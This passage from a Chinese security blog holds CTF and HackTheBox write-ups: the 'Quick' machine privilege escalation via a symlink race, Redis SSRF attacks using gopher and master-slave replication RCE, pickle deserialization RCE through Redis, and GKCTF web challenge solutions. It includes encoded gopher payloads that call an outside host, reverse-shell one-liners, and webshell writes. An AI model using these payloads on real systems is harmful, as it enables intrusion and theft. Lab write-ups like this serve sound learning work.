$cmd)\"/&gt;Process: &lt;xsl:value-of select=\"$process\"/&gt;Command: &lt;xsl:value-of select=\"$cmd\"/&gt;&lt;/root&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt; 先raise一个ticket后准备好监听，search.php传值直接触发 到此为止即可弹到用户sam的shell。拿到user.txt 上面一套流程走下来后花了快有7个小时。只能算是配环境(甚至还没配成)跟猜用户名的锅。但同时也表现出enumeration的过程有多重要。否则甚至不能正常进行后面的提权。java的命令执行这个小trick对于新手而言也许很坑。但是仍然是有方法的。比如wget一个netcat过去再执行(windows常规操作，尤其是在windowsdefender日渐强大的今天)。假如熟悉java的话则应该很快就能构造出弹shell的payload.不至于卡在RCE却无法getshell. privesc to srvadm得到用户sam后准备开始提权。首先是常规的linpeas.sh传到靶机上扫一遍。接着是python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;维持shell.毕竟一套流程下来getshell也不是那么迅速的。(当然可以写个ssh公钥，就是我搞忘了2333) 脚本扫过一遍后并没有什么收获。倒是在html的源码里找到了php的db.php泄露了数据库信息 123&lt;?php$conn = new mysqli(\"localhost\",\"db_adm\",\"db_p4ss\",\"quick\");?&gt; 登录mysql从users表里拿到两个用户及各自密码的hash 12| Elisa | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d || Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 | 此时靶机还剩下一个要提权的用户srvadm。这里泄露了密码，当然要去php源码里看看密码是怎么与hash进行对比的login.php中 1password=md5(crypt($password,'fa')) 既然盐值以及加密都不算难。我们直接用脚本+rockyou.txt来试试爆破 1234567891011121314151617181920import cryptimport hashlibdef get_md5(s): md = hashlib.md5() md.update(s.encode('utf-8')) return md.hexdigest()f=open('rockyou.txt','r')for i in range(1,10000000): try: word=f.readline().strip() except: continue hashes=crypt.crypt(word,'fa') cipher=get_md5(hashes) if cipher=='e626d51f8fbfd1124fdea88396c35d05': print('Found: '+word) break 得到srvadm的密码后当然先试试看是不是ssh或者系统密码了。但很可惜都不是。既然如此，这个密码只能在web服务上发挥作用了。那么说还有其他web服务？ 这时我注意到了/var/www/里除了html还有两个文件夹 诡异的是jobs是777权限。似乎可以做文章。那么转而去旁边的printer中找。发现又是一套带了cms的php源码。并且用的数据库跟之前html中的是一致的。也就是说我们爆破出的密码有用了。 简单审下后发现一个似乎存在漏洞的地方(实际上当时关注点错了)job.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phprequire __DIR__ . '/escpos-php/vendor/autoload.php';use Mike42\\Escpos\\PrintConnectors\\NetworkPrintConnector;use Mike42\\Escpos\\Printer;include(\"db.php\");session_start();if($_SESSION[\"loggedin\"])&#123; if(isset($_POST[\"submit\"])) &#123; $title=$_POST[\"title\"]; $file = date(\"Y-m-d_H:i:s\"); file_put_contents(\"/var/www/jobs/\".$file,$_POST[\"desc\"]); chmod(\"/var/www/printer/jobs/\".$file,\"0777\"); $stmt=$conn-&gt;prepare(\"select ip,port from jobs\"); $stmt-&gt;execute(); $result=$stmt-&gt;get_result(); if($result-&gt;num_rows &gt; 0) &#123; $row=$result-&gt;fetch_assoc(); $ip=$row[\"ip\"]; $port=$row[\"port\"]; try &#123; $connector = new NetworkPrintConnector($ip,$port); sleep(0.5); //Buffer for socket check $printer = new Printer($connector); $printer -&gt; text(file_get_contents(\"/var/www/jobs/\".$file)); $printer -&gt; cut(); $printer -&gt; close(); $message=\"Job assigned\"; unlink(\"/var/www/jobs/\".$file); &#125; catch(Exception $error) &#123; $error=\"Can't connect to printer.\"; unlink(\"/var/www/jobs/\".$file); &#125; &#125; else &#123; $error=\"Couldn't find printer.\"; &#125; &#125;?&gt;&lt;?php &#125; else&#123; echo '&lt;script&gt;alert(\"Invalid Username/Password\");window.location.href=\"index.php\";&lt;/script&gt;';&#125;?&gt; 其中用到的框架的部分经搜索后发现只是一个类似‘打印’功能的框架。比如NetworkPrintConnector就是调用了一个fsockopen()。 接下来的部分就是最让我头疼的部分。很大程度上是经验不足吧。现在既然要提权，并且有存在漏洞的web服务了，那么它肯定得是srvadm运行的，才能让我有提权机会。然而我在找服务这里却浪费了很多时间：开始看端口发现有80端口，于是直接curl.得到的却是之前9001端口的php+esigate页面。导致我以为80端口运行的是nginx给java做的反代。之后把靶机端口全过了一遍也没有找到哪个端口是跑的printer的web服务。甚至也没找到srvadm在运行什么服务的信息。导致自己瞬间迷茫。 之后在这块询问了下外国友人bigFish43。他给我的提示是查看下apache的config文件。于是思路瞬间明朗起来。在sites-enabled/000-default.conf里找到了子域名printerv2.quick.htb并且正如所预料的，是以srvadm用户运行的。 apache的virtualhost跑在80端口上。不过同时我们知道html文件夹里的的服务也跑在80端口上。那么需要更改Host才能访问靶机上curl localhost -H &#39;Host: printerv2.quick.htb&#39;后终于得到了来自printer的回显。那么下一步就是，为了直接在本地访问到printerv2.quick.htb，必须要进行端口转发了。因为我们最早nmap探测80端口时是没有开启的。说明这里apache服务是运行在本地的。 转发端口同样也有至少两种方法。ssh或者上工具chisel。这里我没有用ssh登录，所以直接用chisel。chisel之前做sniper也用过了。这里直接留传完chisel后的命令 12345#kali./chisel_linux_amd64 server -p 8000 --reverse#sam@quick./chisel_linux_amd64 client 10.10.14.40:8000 R:80:127.0.0.1:80 意思就是，靶机借用8000端口的中转，把靶机的80端口转到kali的127.0.0.1:80即本地80端口. 这样就把80端口转发到本地了。接下来由于要修改hostname。因为不想影响访问之前的网址。直接开个burp来修改Host header.只要保持burp打开，我们每次访问的Host都会被替换.即可在本地访问进行操作。 接下来就是渗透的难点了。前面提到说job.php看起来有漏洞，但究竟漏洞在哪？开始我觉得有漏洞是因为里面出现了chmod(xxx,777)。但仔细一看却发现那个/var/www/printer/jobs路径不存在？既然如此，代码逻辑就是： 接受我们post的参数，执行file_put_contents()在/var/www/jobs写入一个文件名为当前日期的文件。并且chmod一个不存在的文件。 执行sql查询。假如jobs库里有内容。按照查询结果远程连接到对应的ip,port.sleep(0.5)后执行file_get_contents()读我们之前的文件，并最后删除;jobs库无内容直接退出。 这里卡了好久后我突然想起来/var/www/jobs文件夹是777权限。那么我们可以写文件这点就非常重要。于是立刻就有了两种使用短链接的条件竞争 不要在数据库中插入新数据。这样srvadm创建的文件就会留下来。如果我们提前创建一个同名文件(因为文件名为时间这点是可预测的)。并利用短链接将其链接向srvadm的sshkey.那么执行file_put_contents()时不就可以写入我们自己的公钥了吗？ 在前面printer.php就输入host跟port.即在数据库插入数据。这样job.php就会进行读文件并打印内容。而我们可以用nc接收。只要在写文件跟读文件的间隔中删掉文件并建立一个到ssh私钥的短链接。php就会把读到的私钥发给我们。 这里两种思路同时想到，我立刻选择了前者。因为后者算比较纯粹的条件竞争,时间不好把控(所以叫Quick)，我选择前者。 操作起来比想象中简单。我一次就成了。假如同时做靶机的人比较多的话就另谈，其实就是算好一个提前量。并且执行 1ln -s /home/srvadm/.ssh/authorized_keys 2020-06-23_06:00:00 然后差不多算好时间提前burp重复发包。这里因为精度被限制在1s.所以写入我们的key的可能性不小。 之后直接ssh登录即可 12chmod 600 id_rsassh -i id_rsa srvadm@10.10.10.186 这里我虽然没试第二种思路，但做完靶机后看到其他人的wp里写到了解决方法: 执行一个bashscript 123456789cd &#x2F;var&#x2F;www&#x2F;jobs;while true;do for file in $(ls .); do rm -rf $file; ln -s &#x2F;home&#x2F;srvadm&#x2F;.ssh&#x2F;id_rsa $file; donedone 然后起一个nc监听。并在job.php提交内容写入。这样就能得到私钥并且直接登录了。 这段内容其实花的时间不比第一部分少。甚至于我遇到的困难更多。比如在找服务上太傻了。之后想起运行pspy64s时也发现了系统是有apache服务跑着的。那肯定就得去找配置文件。结果自己只看了apache的apache2.conf就了事了。该打。然后就是后面的漏洞利用。那个chmod着实害人，开始还想着把短链接链到那个不存在的文件。仔细一想才发现其实直接链到key就可了。 privesc to root到root的部分才是真正的Quick。只需要待在自己的home文件夹进行enum即可。 这里按照sshkey的创建时间，找一下3-21之前一个月不到的文件。 1234567891011121314srvadm@quick:/home/srvadm# find . -type f -newermt \"2020-03-01\" ! -newermt \"2020-03-21\" -ls 2&gt;/dev/null 281794 4 -rw-r--r-- 1 srvadm srvadm 4038 Mar 20 06:23 ./.cache/conf.d/printers.conf 281793 8 -rw-r--r-- 1 srvadm srvadm 4569 Mar 20 06:20 ./.cache/conf.d/cupsd.conf 281799 72 -rw-rw-r-- 1 srvadm srvadm 71479 Mar 20 06:46 ./.cache/logs/debug.log 281798 4 -rw-rw-r-- 1 srvadm srvadm 1136 Mar 20 06:39 ./.cache/logs/error.log 281791 12 -rw-r--r-- 1 srvadm srvadm 9064 Mar 20 06:19 ./.cache/logs/cups.log 281425 0 -rw-r--r-- 1 srvadm srvadm 0 Mar 20 02:38 ./.cache/motd.legal-displayed 281369 4 -rw-r--r-- 1 srvadm srvadm 220 Mar 20 02:16 ./.bash_logout 281797 4 -rw------- 1 srvadm srvadm 23 Mar 20 06:46 ./.local/share/nano/search_history 281421 4 -rw-r--r-- 1 srvadm srvadm 222 Mar 20 02:38 ./.ssh/known_hosts 281418 4 -rw------- 1 srvadm srvadm 1679 Mar 20 02:37 ./.ssh/id_rsa 281419 4 -rw-r--r-- 1 srvadm srvadm 394 Mar 20 02:37 ./.ssh/id_rsa.pub 281370 4 -rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 ./.bashrc 281371 4 -rw-r--r-- 1 srvadm srvadm 807 Mar 20 02:16 ./.profile 一个个读后发现关键信息在./.cache/conf.d/printers.conf 1DeviceURI https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer 之前学ssrf时总结过url的属性。username:password@host的格式告诉了我们&amp;ftQ4K3SGde8?密码。所以直接尝试su到root。直接拿到rootshell. ssh也是同样 summary本次渗透前后花了不少时间。相比之前看ippsec视频做退役靶机,独立完成一台困难靶机真的感觉很不错，也很艰辛。当然，能完整做完很大程度上是因为这台靶机的内容很适合CTF的web选手。自己在很多地方也都运用到了自己日常比赛时的小技能。同时靶机关于http/3,xslt-&gt;RCE,提权方法等等都有很大收获。所以非常赞。 其实前前后后做了快20多台HTB靶机,感觉自己经常卡在enumeration也就是枚举(信息收集)上。而这往往是解决问题的关键。希望能够多锻炼下自己这方面的能力吧。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"},{"name":"hackthebox","slug":"hackthebox","permalink":"https://www.bycsec.top/tags/hackthebox/"},{"name":"pentest","slug":"pentest","permalink":"https://www.bycsec.top/tags/pentest/"},{"name":"Linux","slug":"Linux","permalink":"https://www.bycsec.top/tags/Linux/"}]},{"title":"初探Redis-wdb玄武组ssrfme&pwnhub公开赛","slug":"初探Redis-wdb玄武组ssrfme&pwnhub公开赛","date":"2020-05-30T14:11:48.000Z","updated":"2021-02-18T05:08:25.481Z","comments":true,"path":"2020/05/30/初探Redis-wdb玄武组ssrfme&pwnhub公开赛/","link":"","permalink":"https://www.bycsec.top/2020/05/30/%E5%88%9D%E6%8E%A2Redis-wdb%E7%8E%84%E6%AD%A6%E7%BB%84ssrfme&pwnhub%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"本学期最后一篇文章。写完就要复习去了。 文章写在RCTF第一天。web狗真实自闭.本来想把假期前最后一篇文章留给RCTFwp的。现在看都不用写了,反正只会一道。原先听说过ROIS的web很强，zsx大师傅是巨佬，没想到恐怖如斯。(这就是ROIS跟zsx的可怕之处吗,怕了怕了) 所以比赛第一天留意到有个pwnhub公开赛，于是就去水了下，好歹是拿了个邀请码。这题因为是redis相关，联想到之前网鼎杯玄武的那道redis，加上自己原来基本没做过redis题，打算把这两道题相关知识点都总结下，当做这学期的收尾吧。","text":"本学期最后一篇文章。写完就要复习去了。 文章写在RCTF第一天。web狗真实自闭.本来想把假期前最后一篇文章留给RCTFwp的。现在看都不用写了,反正只会一道。原先听说过ROIS的web很强，zsx大师傅是巨佬，没想到恐怖如斯。(这就是ROIS跟zsx的可怕之处吗,怕了怕了) 所以比赛第一天留意到有个pwnhub公开赛，于是就去水了下，好歹是拿了个邀请码。这题因为是redis相关，联想到之前网鼎杯玄武的那道redis，加上自己原来基本没做过redis题，打算把这两道题相关知识点都总结下，当做这学期的收尾吧。 网鼎杯玄武组ssrfme这题真没想到，是郁师傅出的题……网上大部分做法都是主从复制RCE做的，不过郁师傅说试试不用主从复制做,不知道是什么姿势。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php function check_inner_ip($url) &#123; $match_result=preg_match('/^(http|https|gopher|dict)?:\\/\\/.*(\\/)?.*$/',$url); if (!$match_result) &#123; die('url fomat error'); &#125; try &#123; $url_parse=parse_url($url); &#125; catch(Exception $e) &#123; die('url fomat error'); return false; &#125; $hostname=$url_parse['host']; $ip=gethostbyname($hostname); $int_ip=ip2long($ip); return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16; &#125; function safe_request_url($url) &#123; if (check_inner_ip($url)) &#123; echo $url.' is inner ip'; &#125; else &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_HEADER, 0); $output = curl_exec($ch); $result_info = curl_getinfo($ch); if ($result_info['redirect_url']) &#123; safe_request_url($result_info['redirect_url']); &#125; curl_close($ch); var_dump($output); &#125; &#125; if(isset($_GET['url']))&#123; $url = $_GET['url']; if(!empty($url))&#123; safe_request_url($url); &#125; &#125;else&#123; highlight_file(__FILE__);&#125;// Please visit hint.php locally. ?&gt; 首先拿到题目是经典的yulige标配ssrf。可以看到,我们允许使用的scheme是http,gopher以及dict。然后需要绕过一个内网ip检测，即可进行curl的ssrf. 看到提示说访问hint.php。看来需要绕过ip限制进行内网访问。这个点之前总结ssrf时提到过,算是基本trick了 1url&#x3D;http:&#x2F;&#x2F;bycsec.top@0.0.0.0&#x2F;hint.php 0.0.0.0默认本地。@则是因为phpparse_url只会匹配到最后一个@后的内容的原因。这样我们就可以绕过了。 得到一个redis密码。下面是试图得到webshell 通常来说ssrf+redis getshell主要是这几种姿势 可写webshell。 写ssh公钥 写crontab反弹shell(仅限centos) 主从复制RCE 这里最简单的是可写webshell的情况。具体上就跟之前GKCTF那题一样，payload编码好就能用gopher打。 此处虽然是php,但是并不能写webshell。剩下的当然是更不可能的。因为没有ssh跟crontab服务。那么值得一试的就是主从复制RCE了 详细知识可以去看郁师傅在xray社区发的redis安全学习小记。 主从复制，主要利用的就是redisSLAVE OF的命令，将一台redis的数据复制到另一台。前者为主节点，后者为从节点。这个复制过程是单向的。 而我们redis主从复制RCE的方式，其实就是利用了redis简洁的协议，构造恶意服务器，将原本用于存储备份的rdb文件,替换为我们恶意的exp.so。这样节点redis中就会自动生成exp.so，使得我们可以用load_module进行rce. 需要注意的是,因为利用redis写文件的方式写入exp.so会因为redis的大量无用数据padding影响其正常使用。而我们利用主从复制上传so，主要用到的是web应用层面的上传。而php默认的www-data是644,拥有只读权限。实战中是完全可以结合上传攻击的。 因此本题只要用到两个两个工具即可https://github.com/xmsec/redis-ssrfhttps://github.com/n0b0dyCN/redis-rogue-server 前者用于生成payload，同时也可启动恶意server。后者主要是exp.so。建议把exp.so直接拷到前面文件夹下就行了。 然后我们设置对应的payload。修改ssrf-redis.py在默认的rce模式下,只要改命令，lhost,lport,密码即可。然后启动恶意服务器。用前面生成好的payload直接打。url=gopher%3a%2f%2fwww.bycsec.top%400.0.0.0%3a6379%2f_%252A2%250D%250A%25244%250D%250AAUTH%250D%250A%252430%250D%250Awelcometowangdingbeissrfme6379%250D%250A%252A3%250D%250A%25247%250D%250ASLAVEOF%250D%250A%252414%250D%250A120.27.246.202%250D%250A%25244%250D%250A6666%250D%250A%252A4%250D%250A%25246%250D%250ACONFIG%250D%250A%25243%250D%250ASET%250D%250A%25243%250D%250Adir%250D%250A%25245%250D%250A%2ftmp%2f%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25246%250D%250Aexp.so%250D%250A%252A3%250D%250A%25246%250D%250AMODULE%250D%250A%25244%250D%250ALOAD%250D%250A%252411%250D%250A%2ftmp%2fexp.so%250D%250A%252A2%250D%250A%252411%250D%250Asystem.exec%250D%250A%252413%250D%250Acat%2524%257BIFS%257D%2ffl%252A%250D%250A%252A1%250D%250A%25244%250D%250Aquit%250D%250A第一次打会建立好主从复制。这时候就可以关掉server直接用ssrf命令进行RCE了。 pwnhub公开赛-七爪鱼 flag在线爬取系统这次做题本来是因为被RCTF虐惨了跑去看看的。结果难度似乎适中。刚好给我一点点满足感。 首先题目server是gunicorn的配置。这个从header中可以看出来。然后注册登录后发现有一个爬虫/spider路由。拿file:///etc/passwd打一发可以读到/etc/passwd.看来又是个ssrf。同时注意到用户里有redis-db跟server.看来是有redis了。 简单探测下发现6379端口有redis的报错回显。 第一反应先读了下bash_history。发现一个没权限一个不存在。(假如能用这种方式知道根目录flag的名称那就会简便很多，这也是我在wustctf当时直接读到flag的非预期思路) 然后期间触发了报错。发现是python的urllib库调用的urlopen。这个库熟悉的话应该都知道是存在CRLF的洞的。我们可以用这个ssrf往自己服务器打一波。nc监听的话会发现是python3.5的urllib。 对urllib的ssrf,用http协议下的可以直接打 123456http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aKEYS%20*%0d%0apadding只返回$-1http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aconfig%20set%20dir%20&#x2F;tmp%0d%0aconfig%20set%20dbfilename%20byc%0d%0asave%0d%0apaddingfile:&#x2F;&#x2F;&#x2F;tmp&#x2F;byc成功写入文件 那么此时大致确认可以用这个ssrf打redis了。但是要注意的是我们python服务器不能直接写webshell。不能写定时和key。而且由于gopher不支持也不能进行RCE。换言之我们只能对redis进行命令操作。所以我想先尝试探测源码信息 首先是/proc/self/cmdline。读到了gunicorn的相关配置。 /usr/local/python3/bin/python3.5/usr/local/python3/bin/gunicorn--config=config.pyrun:app 得到run.py。这里直接用/proc/self/cwd/run.py去读工作目录下的源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# -*- coding: utf-8 -*-import picklefrom sipder import Spiderfrom redis import StrictRedisfrom flask import Flask, render_template, redirect, session, request, make_response, url_for, abort, render_template_stringfrom user import *app = Flask(__name__)redis = StrictRedis(host='127.0.0.1',port=6379,db=0)@app.route('/')def index(): cookie = request.cookies.get(\"Cookie\") return redirect(url_for(\"login\"))@app.route('/login/',methods=['GET','POST'])def login(): if request.method != 'GET': username = request.form.get('username') password = request.form.get('password') cookie = Cookie() cookie.create = username cookie = cookie.create try: if redis.exists(cookie): user = pickle.loads(redis.get(cookie)) if user.verify_pass(password): resp = make_response(redirect(url_for('home'))) resp.set_cookie('Cookie',cookie) return resp except: abort(500) return render_template(\"login.html\")@app.route('/register/',methods=['GET','POST'])def register(): if request.method != 'GET': email = request.form.get('email') username = request.form.get('username') password = request.form.get('password') user = User(email,username,password) cookie = Cookie() cookie.create = username cookie = cookie.create try: if not redis.exists(cookie): redis.set(cookie,pickle.dumps(user)) resp = make_response(redirect(url_for('home'))) resp.set_cookie(\"Cookie\",cookie) return resp except: abort(500) return render_template(\"register.html\") @app.route('/home/',methods=['GET','POST'])def home(): cookie = request.cookies.get('Cookie') try: if Cookie.verify(cookie) and redis.exists(cookie): user = redis.get(cookie) user = pickle.loads(user) if request.method != \"GET\": formlist = request.form.to_dict() User.modify_info(user,formlist) redis.set(cookie,pickle.dumps(user)) return render_template(\"home.html\",user=user) return render_template(\"home.html\",user=user) except: return abort(500) return redirect(url_for(\"login\"))@app.route('/spider/',methods=['GET','POST'])def spider(): cookie = request.cookies.get('Cookie') try: if Cookie.verify(cookie) and redis.exists(cookie): user = redis.get(cookie) user = pickle.loads(user) except: return abort(500) result='' if request.method == \"GET\": result='' elif request.method != \"GET\" and request.form.get('url')!=None: try: target_url = request.form.get('url') new_spider = Spider(target_url) result = new_spider.spiderFlag() except Excetion as e: result = e return render_template(\"spider.html\",result=str(result),user=user)@app.route('/testSpider/')def TSpider(): html = '&lt;div id=\"flag\"&gt;Flag&#123;hahaha This is a test for tested Spider mode&#125;&lt;/div&gt;' return render_template_string(html)@app.route('/logout/')def logout(): resp = make_response(redirect(url_for('login'))) resp.set_cookie('Cookie','') return resp@app.errorhandler(500)def error(e): return render_template(\"error.html\")if __name__ == \"__main__\": app.run( debug=True, port=5000, host=\"0.0.0.0\" ) 从调用的包看到还有两个自定义的包。也一并读下来、sipder.py 1234567891011121314151617181920212223242526import urllibimport urllib.requestfrom bs4 import BeautifulSoupclass Spider: def __init__(self, url): self.target_url = url def __getResponse(self): try: info = urllib.request.urlopen(self.target_url).read().decode(\"utf-8\") return (info, True) except Exception as err: return (err, False) def spiderFlag(self): infos = self.__getResponse() if infos[1]: soup = BeautifulSoup(infos[0]) flag = soup.find(id=='flag') return infos[0] return flag.text return infos[0] user.py 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849-*- coding: utf-8 -*-from hashlib import md5# here put the import libclass User(object): def __init__(self,email,username,password): self.email = email self.username = username self.password = md5(password.encode(encoding='utf8')).hexdigest() self.phone = None self.qqnumber = None self.intro = None def verify_pass(self,password): if password and md5(password.encode(encoding='utf8')).hexdigest() == self.password: return True return None @staticmethod def modify_info(obj,dict): for key in dict: if hasattr(obj,key) and dict[key]!='': setattr(obj,key,dict[key]) class Cookie(object): __key = \"abcd\" def __init__(self): __key = \"abcd\" @property def create(self): self.mix_str = (self.username+Cookie.__key).encode(encoding=\"utf8\") self.md5_str = self.username+md5(self.mix_str).hexdigest() return self.md5_str @create.setter def create(self,username): self.username = username @staticmethod def verify(verify_cookie): if verify_cookie: username = verify_cookie[:-32] verify_str = verify_cookie[-32:] return md5((username+Cookie.__key).encode(encoding=\"utf8\")).hexdigest()==verify_str return None 这里主要得到两个信息。redis无密码。且是用来存储cookie的。而cookie的值会被调用出来进行pickle的反序列化。 不用说，我们也大致明白思路了：操作redis修改cookie键对应的值。用cookie刷新触发反序列化RCE。这个考点在去年的swpuctf的web2中也出现过。可惜自己因为环境问题一直没能在buu上做。 这里基于源码比较齐全。我就本地简单搭建了一个server。然后触发一个生成cookie存储的过程。看看大致的存储规律实际上就是以我们的cookie作为键，pickle的opcode作为值，比flask的默认存储直观很多。 那么很简单了，我们生成下RCE代码 123456789import pickleimport urllib.parseclass exp(object): def __reduce__(self): return (eval,(\"__import__('os').system('echo `ls /` &gt; /tmp/byc')\",))a = exp()s=pickle.dumps(a)print(s) 这里为了不给服务器带来困扰，直接把根目录ls的结果写到tmp目录下，然后我们就能用读文件的途径直接读了。 命令 1http:&#x2F;&#x2F;127.0.0.1:6379?%0d%0aset &quot;byc40418e2b681af1051d6fcb32e3d3f7071f6&quot; &quot;\\x80\\x03cbuiltins\\neval\\nq\\x00X7\\x00\\x00\\x00__import__(&#39;os&#39;).system(&#39;echo &#96;ls &#x2F;&#96; &gt; &#x2F;tmp&#x2F;byc4&#39;)q\\x01\\x85q\\x02Rq\\x03.&quot;%0d%0apadding 开始我在担心编码问题。后来发现应该不用在意。直接用python3的opcode结果就可以了。刷新下cookie对应页面,然后读文件file:///tmp/byc4 接下来就可以直接读flag了。当然后面我试了下直接用curl xxx|bash弹个shell也是可以的。方法有很多。 小结两道题都算是php与redis以及python与redis的经典搭配了。当然redis的利用还有很多，以后会慢慢学习。 然后RCTF险些爆零……calc这题真的是太考验基本功了。做的人心累。 最后就要收心好好复习了。这学期大部分时间都花在了ctf上，课业不像以往那样心里有底了。感觉得好好复习一把。现在CTF马上也快打一年了，自己很高兴水平比以往要高了不少。但是自己作为x1c的web手，还是感觉实力跟别的强队相比差了不少。希望暑假能好好研究下自己想学的东西,尽量过的充实点吧。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"},{"name":"redis","slug":"redis","permalink":"https://www.bycsec.top/tags/redis/"}]},{"title":"GKCTF2020writeup","slug":"GKCTF2020writeup","date":"2020-05-24T11:47:39.000Z","updated":"2021-02-18T05:09:02.114Z","comments":true,"path":"2020/05/24/GKCTF2020writeup/","link":"","permalink":"https://www.bycsec.top/2020/05/24/GKCTF2020writeup/","excerpt":"这周末打了两个比赛。BJDCTF3rd与GKCTF.这里个人认为GKCTF的题目收获挺多的,但是时间太紧，自己也在简单题上浪费了不少时间。所以把比赛时没来的及看或者没做出来的题都补全。","text":"这周末打了两个比赛。BJDCTF3rd与GKCTF.这里个人认为GKCTF的题目收获挺多的,但是时间太紧，自己也在简单题上浪费了不少时间。所以把比赛时没来的及看或者没做出来的题都补全。 check_in题目给出了源码。基本机理就是从$_REQUEST里获取Ginkgo变量然后eval执行。phpinfo()的话会发现存在disable_function,列目录会发现根目录有readflag.但是不要紧。我们有bypass脚本用,下面就是之前做buu上一道l33t-hoster的脚本拿来改的 123456789101112131415import requestsimport base64url='http://5e0893e9-0a1c-4836-8865-2771c87a52e4.node3.buuoj.cn/'def command(payload): return &#123;\"Ginkgo\":base64.b64encode(payload.encode('utf-8')).decode('utf-8')&#125;payload=\"move_uploaded_file($_FILES['file']['tmp_name'],'/tmp/exploit.php');echo 'ok';var_dump(scandir('/tmp'));\"files = [('file',('exploit.php',open(\"exploit.php\",\"rb\"),'application/octet-stream'))]r = requests.post(url=url,data=command(payload),files=files)r=requests.post(url=url,data=command('include(\"/tmp/exploit.php\");'))print(r.text) 脚本要传到/tmp下,否则其他目录应该是不可写的。然后包含即可。 老八小超市儿这题说实话挺简单的。就是手慢了几步。首先后台getshell不讲了,主要是按照网上能搜到的ShopXO全版本getshell流程走：先默认密码登录后台,下载主题并加上webshellbyc.php,再重新上传zip文件,访问/public/static/index/default/byc.php即可. 拿到www-data的shell后发现需要提权。然后根目录flag.hint里给了个日期.不过我并没有怎么在意这个日期,而是按照自己htb渗透的习惯来. 首先理论上应该来个扫描脚本的。不过这里很明显就能在根目录ls -la时发现auto.sh是root用户运行一个python脚本，每一分钟执行一次。找到python脚本后发现有写的权限。 那就很简单了,直接写入命令import os;os.system(&#39;curl xxx|bash&#39;)(这里之前为了弹www-data的shell提前准备好了反弹脚本)然后等待监听的端口返回rootshell即可。flag在root目录下 EZ三剑客-EzWeb这题二血。算是比较有意思的题目。 首先会发现首页功能似乎是个ssrf。然后还给出了?secret参数看ip地址.不过其实这里并不需要给ip的,因为可以直接读/etc/hosts 当然,想要常规的file协议读肯定是不行的.但是它过滤的不严，可以用类似xxe里利用file协议列目录的方式来读file:/var/www/html/index.php得到源码 1234567891011121314151617181920212223&lt;?phpfunction curl($url)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch);&#125;if(isset($_GET['submit']))&#123; $url = $_GET['url']; //echo $url.\"\\n\"; if(preg_match('/file\\:\\/\\/|dict|\\.\\.\\/|127.0.0.1|localhost/is', $url,$match)) &#123; //var_dump($match); die('别这样'); &#125; curl($url);&#125;if(isset($_GET['secret']))&#123; system('ifconfig');&#125;?&gt; 不过flag并不在本机173.92.140.13。实际上这种方式想读根目录也并不可行。但基于这里是个curl的ssrf。那么就大有可为。不过这一步浪费了不少时间,后面才反应过来可以顺着探内网。尝试直接顺着ip探内网存活主机,发现173.92.140.13,提示其他端口,猜测是redis或者mysql之类的。于是探6379端口得到redis的报错命令。那么基本可以确认是gopher协议利用ssrf打redis未授权getshell了。可以看这篇文章Redis和SSRF 命令的构建主要是编码问题。把命令进行正确编码就能打了 1gopher:&#x2F;&#x2F;173.92.140.13:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A 这样就在140.13那写入webshell。然后直接173.92.140.13/shell.php?cmd=cat%20/flag即可 EZ三剑客-EzTypecho这题真的可惜。比赛时因为其他题目没来得及看。结果发现基本就是原本的链子加上一个bypass就行了。 先来过下源码。关于typeecho的洞出在install.php算是比较熟知的了。所以网上基本两个版本的POP链。如果有install.php就可以按第一个的思路走。首先这里的源码表明必须getfinish参数以及带上Referer才不会退出。 接下来是反序列化点这里实际上只加上了一个session的判断。如果以前有现成的pocbypass了这个判断就能直接打了。这里自己先按照链子跟一下。 